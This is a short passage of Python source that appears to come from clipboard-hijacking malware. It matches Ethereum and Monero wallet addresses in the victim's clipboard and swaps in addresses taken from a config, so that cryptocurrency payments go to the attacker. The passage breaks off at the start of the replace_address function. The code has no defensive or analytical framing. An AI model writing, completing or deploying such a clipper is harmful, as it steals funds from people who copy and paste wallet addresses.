            if re.match(r'\b0x[a-fA-F0-9]{40}\b', self.current_clipboard):
                self.replace_address(self.current_clipboard, config.etherium_address)

            if re.match(r'\b4([0-9]|[A-B])(.){93}\b', self.current_clipboard):
                self.replace_address(self.current_clipboard, config.monero_address)

    def replace_address(self, current_clipboard, new_address):
